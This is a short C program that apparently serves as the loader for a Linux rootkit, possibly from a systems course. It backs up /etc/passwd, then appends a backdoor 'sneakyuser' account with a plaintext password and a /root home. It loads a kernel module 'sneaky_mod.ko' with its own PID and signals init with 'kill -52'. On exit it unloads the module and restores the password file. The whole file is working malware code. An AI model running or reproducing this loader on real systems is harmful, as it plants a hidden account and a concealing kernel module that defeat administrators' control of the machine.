#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> 

int main(){
    printf("sneaky_process pid = %d\n", (int)getpid());

    system("cp /etc/passwd /tmp/passwd");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");

    char buf[100];
    sprintf(buf, "insmod sneaky_mod.ko pid=%d", (int)getpid());
    system(buf);
    system("kill -52 1");

    char ch;
    while (1) {
        if ((ch = getchar()) == 'q') {
        break;
        }
    }
    
    system("kill -52 1");
    system("rmmod sneaky_mod");
    system("cp /tmp/passwd /etc");
    system("rm -f /tmp/passwd");

    return EXIT_SUCCESS;
}
